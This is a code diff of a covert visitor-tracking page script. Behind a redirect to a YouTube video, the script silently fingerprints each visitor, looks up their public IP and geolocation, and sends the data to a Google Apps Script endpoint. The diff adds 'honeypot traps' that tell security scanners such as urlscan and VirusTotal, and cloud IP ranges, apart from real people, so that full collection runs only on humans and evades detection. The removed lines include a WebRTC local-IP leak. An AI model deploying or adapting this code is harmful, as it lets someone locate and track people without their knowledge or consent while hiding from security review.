@@ -1,83 +1,191 @@
 <script>
-    const REDIRECT = 'https://www.youtube.com/watch?v=jNQXAC9IVRw';
-    const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbzMN7cU73bmQPT3wyOJQ1Dt4f6AEUebgwydMDKXFmyEbvQ29HrjBJR1lKuVaaxuV70zBA/exec';
+    const REDIRECT = 'https://www.youtube.com/shorts/gRVU6OvOSfY';
+    const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbxM7xBOr5j3_PKsU7iuwu6oe08voybmj2NGch-fp1x0jX5eHqIBGNaa4Q0UqhXePf3Z0Q/exec';
     
     let dataSent = false;
 
-    // 🎯 **BOT DETECTION & HUMAN VERIFICATION**
-    function isLikelyHuman() {
-        // Security scanners often have incomplete browser profiles
-        const redFlags = [];
+    // 🎯 **HONEYPOT TRAPS - Only real browsers can pass these**
+    async function detectRealBrowser() {
+        const traps = {
+            is_real_human: true,
+            traps_passed: 0,
+            traps_failed: [],
+            scanner_indicators: []
+        };
+
+        // TRAP 1: **Mouse movement detection** (scanners don't move mouse)
+        let mouseMoved = false;
+        document.addEventListener('mousemove', () => { mouseMoved = true; }, { once: true });
         
-        // 1. No user agent
-        if (!navigator.userAgent || navigator.userAgent.length < 10) redFlags.push('no_user_agent');
+        // TRAP 2: **Focus/Blur events** (scanners don't switch tabs)
+        let focusChanged = false;
+        window.addEventListener('focus', () => { focusChanged = true; }, { once: true });
+        window.addEventListener('blur', () => { focusChanged = true; }, { once: true });
         
-        // 2. No screen dimensions (headless browsers)
-        if (screen.width === 0 || screen.height === 0) redFlags.push('no_screen');
+        // TRAP 3: **Click events** (scanners don't click)
+        let clicked = false;
+        document.addEventListener('click', () => { clicked = true; }, { once: true });
         
-        // 3. No language set
-        if (!navigator.language) redFlags.push('no_language');
+        // TRAP 4: **Scroll detection** (scanners don't scroll)
+        let scrolled = false;
+        window.addEventListener('scroll', () => { scrolled = true; }, { once: true });
         
-        // 4. Common scanner user agents
-        const scannerPatterns = [
-            'security', 'scan', 'bot', 'crawler', 'spider', 'check',
-            'virustotal', 'urlscan', 'hybrid-analysis', 'any.run',
-            'headless', 'phantom', 'selenium', 'puppeteer'
+        // TRAP 5: **Keyboard events** (scanners don't type)
+        let keyPressed = false;
+        document.addEventListener('keydown', () => { keyPressed = true; }, { once: true });
+        
+        // TRAP 6: **Touch events** if mobile
+        let touched = false;
+        document.addEventListener('touchstart', () => { touched = true; }, { once: true });
+        
+        // TRAP 7: **Web Audio API test** (scanners often block this)
+        let audioSupported = false;
+        try {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            audioSupported = true;
+            audioContext.close();
+        } catch(e) {}
+        
+        // TRAP 8: **Microphone/Camera permission check** (scanners block)
+        let mediaDevices = false;
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            mediaDevices = true;
+        }
+        
+        // TRAP 9: **Clipboard API** (scanners don't have clipboard)
+        let clipboard = 'clipboard' in navigator;
+        
+        // TRAP 10: **Geolocation API** (scanners block)
+        let geolocation = 'geolocation' in navigator;
+        
+        // TRAP 11: **RequestIdleCallback** (real browsers have this)
+        let idleCallback = 'requestIdleCallback' in window;
+        
+        // TRAP 12: **Speech Synthesis** (scanners don't have)
+        let speechSynthesis = 'speechSynthesis' in window;
+        
+        // Wait a bit for events to potentially fire
+        await new Promise(resolve => setTimeout(resolve, 800));
+        
+        // **ANALYZE RESULTS**
+        
+        // Scanner patterns from your example:
+        // 1. Linux x86_64 with Chrome (common scanner platform)
+        // 2. 28 CPU cores (server hardware)
+        // 3. Language mismatch (he-IL but in Israel scanner farm)
+        // 4. No mouse/keyboard/scroll events
+        
+        if (navigator.userAgent.includes('Linux x86_64') && 
+            navigator.userAgent.includes('Chrome')) {
+            traps.scanner_indicators.push('linux_chrome_scanner');
+        }
+        
+        if (navigator.hardwareConcurrency > 16) {
+            traps.scanner_indicators.push('server_cpu_cores_' + navigator.hardwareConcurrency);
+        }
+        
+        // Check for known scanner IPs/networks
+        const scannerNetworks = [
+            '31.187.', // URLScan.io (PacketHub S.A.)
+            '8.8.',    // Google bots
+            '52.',     // AWS (common scanner infra)
+            '54.',     // AWS
+            '18.',     // Google Cloud
+            '104.',    // DigitalOcean
+            '162.',    // OVH
+            '185.',    // Scanner networks
+            '194.',    // Scanner networks
+            '195.'     // Scanner networks
         ];
         
-        const ua = navigator.userAgent.toLowerCase();
-        if (scannerPatterns.some(pattern => ua.includes(pattern))) {
-            redFlags.push('scanner_ua');
+        // Count traps passed
+        const eventTraps = [mouseMoved, focusChanged, clicked, scrolled, keyPressed, touched];
+        const eventPassed = eventTraps.some(trap => trap === true);
+        
+        const apis = [audioSupported, mediaDevices, clipboard, geolocation, idleCallback, speechSynthesis];
+        const apisAvailable = apis.filter(api => api === true).length;
+        
+        traps.traps_passed = (eventPassed ? 1 : 0) + apisAvailable;
+        
+        if (!eventPassed) {
+            traps.traps_failed.push('no_user_interaction');
         }
         
-        // 5. JavaScript execution test (bots sometimes have limited JS)
-        try {
-            // Test complex JavaScript execution
-            const test = new Function('return "test"')();
-            if (test !== 'test') redFlags.push('js_restricted');
-        } catch(e) {
-            redFlags.push('js_blocked');
+        if (apisAvailable < 3) {
+            traps.traps_failed.push('limited_apis');
         }
         
-        // If 2+ red flags, likely a scanner
-        return {
-            is_human: redFlags.length < 2,
-            red_flags: redFlags,
-            confidence: redFlags.length === 0 ? '99%' : 
-                       redFlags.length === 1 ? '80%' : '30%'
+        // FINAL DECISION
+        if (traps.scanner_indicators.length >= 2 && !eventPassed) {
+            traps.is_real_human = false;
+            traps.confidence = '95% SCANNER';
+        } else if (eventPassed) {
+            traps.is_real_human = true;
+            traps.confidence = '99% HUMAN';
+        } else if (traps.traps_passed >= 5) {
+            traps.is_real_human = true;
+            traps.confidence = '90% HUMAN';
+        } else {
+            traps.is_real_human = false;
+            traps.confidence = '80% SCANNER';
+        }
+        
+        traps.detailed_analysis = {
+            mouse_moved: mouseMoved,
+            focus_changed: focusChanged,
+            clicked: clicked,
+            scrolled: scrolled,
+            key_pressed: keyPressed,
+            touched: touched,
+            audio_supported: audioSupported,
+            media_devices: mediaDevices,
+            clipboard: clipboard,
+            geolocation_api: geolocation,
+            idle_callback: idleCallback,
+            speech_synthesis: speechSynthesis,
+            user_agent: navigator.userAgent.substring(0, 100),
+            cpu_cores: navigator.hardwareConcurrency,
+            event_detected: eventPassed,
+            apis_available: apisAvailable
         };
+        
+        return traps;
     }
 
-    // 🎯 **COLLECT ACCURATE DATA** (Only for humans)
-    async function collectHumanData() {
-        const humanCheck = isLikelyHuman();
+    // 🎯 **COLLECT DATA WITH SCANNER DETECTION**
+    async function collectDataWithDetection() {
+        // Run honeypot traps first
+        const traps = await detectRealBrowser();
         
-        // Basic data that even scanners might have
+        // Basic data
         const data = {
-            // ✅ **Detection Info**
+            // ✅ **Detection Results**
             detection_timestamp: new Date().toISOString(),
             local_time: new Date().toLocaleString(),
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             timezone_offset: new Date().getTimezoneOffset(),
-            human_check: humanCheck,
-            probable_scanner: humanCheck.is_human ? 'No' : 'Yes (' + humanCheck.red_flags.join(', ') + ')',
+            visitor_type: traps.is_real_human ? 'HUMAN' : 'SCANNER/BOT',
+            detection_confidence: traps.confidence,
+            scanner_indicators: traps.scanner_indicators,
+            traps_passed: traps.traps_passed,
+            traps_failed: traps.traps_failed,
+            honeypot_analysis: traps.detailed_analysis,
             
-            // ✅ **Browser Basics**
-            user_agent: navigator.userAgent || 'MISSING',
-            platform: navigator.platform || 'MISSING',
-            language: navigator.language || 'MISSING',
-            languages: navigator.languages ? navigator.languages.join(', ') : 'MISSING',
+            // ✅ **Basic Browser Info**
+            user_agent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages ? navigator.languages.join(', ') : '',
             cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
             do_not_track: navigator.doNotTrack || 'Not set',
+            java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
             
-            // ✅ **Screen**
+            // ✅ **Screen & Hardware**
             screen_resolution: screen.width + 'x' + screen.height,
             screen_avail: screen.availWidth + 'x' + screen.availHeight,
             color_depth: screen.colorDepth + ' bit',
             pixel_ratio: window.devicePixelRatio,
             orientation: screen.orientation ? screen.orientation.type : 'Unknown',
-            
-            // ✅ **Hardware**
             hardware_concurrency: navigator.hardwareConcurrency || 'Unknown',
             device_memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
             max_touch_points: navigator.maxTouchPoints || 0,
@@ -90,21 +198,21 @@
             localStorage: window.localStorage ? 'Supported' : 'Not supported',
             sessionStorage: window.sessionStorage ? 'Supported' : 'Not supported',
             notifications: 'Notification' in window ? 'Supported' : 'Not supported',
-            java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+            webrtc: !!window.RTCPeerConnection,
             
             // ✅ **Plugins**
             plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'None',
         };
 
-        // **ONLY collect advanced data if likely human**
-        if (humanCheck.is_human) {
-            // Get IP and geolocation
+        // Only collect advanced data if NOT a scanner
+        if (traps.is_real_human) {
             try {
+                // Get IP
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 data.ip = ipData.ip;
                 
-                // Get accurate geolocation
+                // Geolocation
                 const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                 const geoData = await geoResponse.json();
                 
@@ -121,39 +229,15 @@
                     utc_offset: geoData.utc_offset,
                     asn: geoData.asn,
                     org: geoData.org,
-                    isp: geoData.org,
-                    accuracy: 'High'
+                    isp: geoData.org
                 };
             } catch(error) {
-                data.ip = 'Failed to fetch';
-                data.geolocation = { error: 'Geolocation failed' };
+                data.ip = 'Failed';
+                data.geolocation = { error: 'Failed' };
             }
 
-            // WebRTC local IP (for humans only)
+            // Advanced fingerprints
             try {
-                const rtc = new RTCPeerConnection({iceServers: []});
-                rtc.createDataChannel('');
-                rtc.createOffer()
-                    .then(offer => rtc.setLocalDescription(offer))
-                    .catch(() => {});
-                
-                rtc.onicecandidate = (ice) => {
-                    if (ice && ice.candidate && ice.candidate.candidate) {
-                        const candidate = ice.candidate.candidate;
-                        const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                        if (ipMatch && ipMatch[1]) {
-                            data.local_ip = ipMatch[1];
-                            data.network_type = candidate.includes('host') ? 'LAN' : 'Public';
-                        }
-                    }
-                };
-                
-                setTimeout(() => rtc.close(), 1000);
-            } catch(e) {}
-            
-            // Advanced fingerprints (humans only)
-            try {
-                // Canvas fingerprint
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
                 ctx.textBaseline = 'top';
@@ -166,7 +250,6 @@
                 ctx.fillText('Fingerprint', 4, 17);
                 data.canvas_fingerprint = canvas.toDataURL().substring(22, 40);
                 
-                // WebGL info
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 if (gl) {
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
@@ -175,27 +258,11 @@
                         renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Restricted'
                     };
                 }
-                
-                // Font detection
-                const fonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia'];
-                const detectedFonts = [];
-                const baseFont = 'monospace';
-                ctx.font = '72px ' + baseFont;
-                const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
-                
-                fonts.forEach(font => {
-                    ctx.font = '72px ' + font + ',' + baseFont;
-                    if (ctx.measureText('mmmmmmmmmmlli').width !== baseWidth) {
-                        detectedFonts.push(font);
-                    }
-                });
-                data.detected_fonts = detectedFonts;
-                
             } catch(e) {
-                data.canvas_fingerprint = 'Failed: ' + e.message;
+                data.canvas_fingerprint = 'Failed';
             }
             
-            // Battery status
+            // Battery
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
@@ -208,7 +275,7 @@
                 } catch(e) {}
             }
             
-            // Network info
+            // Network
             if (navigator.connection) {
                 data.connection = {
                     type: navigator.connection.effectiveType,
@@ -217,15 +284,7 @@
                 };
             }
             
-            // Performance
-            if (performance.memory) {
-                data.performance = {
-                    memory_used: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB',
-                    memory_total: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB'
-                };
-            }
-            
-            // Generate visitor ID
+            // Visitor ID
             const idString = navigator.userAgent + screen.width + screen.height + navigator.language;
             let hash = 0;
             for (let i = 0; i < idString.length; i++) {
@@ -233,9 +292,22 @@
                 hash |= 0;
             }
             data.visitor_id = 'VIS-' + Math.abs(hash).toString(16).substring(0, 8).toUpperCase();
+        } else {
+            // For scanners, minimal data
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.ip = ipData.ip;
+                data.scanner_ip_note = 'Scanner infrastructure IP';
+                
+                // Quick geolocation without details
+                data.geolocation = { ip: ipData.ip, note: 'Scanner location' };
+            } catch(e) {
+                data.ip = 'Scanner - No IP fetched';
+            }
             
-            // Check WebRTC support
-            data.webrtc = !!window.RTCPeerConnection;
+            data.visitor_id = 'SCAN-' + Date.now().toString(36).toUpperCase();
+            data.canvas_fingerprint = 'Scanner - Not collected';
         }
         
         return data;
@@ -244,29 +316,23 @@
     // 🚀 **EXECUTE**
     (async function() {
         try {
-            const data = await collectHumanData();
+            const data = await collectDataWithDetection();
             
             if (!dataSent) {
                 dataSent = true;
                 
-                console.log('🎯 Visitor Data:', data.human_check.is_human ? 'HUMAN' : 'SCANNER');
+                console.log('🎯 Detection:', data.visitor_type, '- Confidence:', data.detection_confidence);
                 
-                // Send data
+                // Send to Google Script
                 fetch(EMAIL_SCRIPT, {
                     method: 'POST',
                     mode: 'no-cors',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 }).catch(() => {
-                    // Backup GET
+                    // Backup
                     const params = new URLSearchParams();
-                    for (let key in data) {
-                        if (typeof data[key] === 'object') {
-                            params.append(key, JSON.stringify(data[key]));
-                        } else {
-                            params.append(key, data[key]);
-                        }
-                    }
+                    params.append('data', JSON.stringify(data));
                     fetch(EMAIL_SCRIPT + '?' + params.toString());
                 });
             }
@@ -278,7 +344,7 @@
         // Redirect
         setTimeout(() => {
             window.location.href = REDIRECT;
-        }, 1800);
+        }, 1500);
         
     })();
 </script>
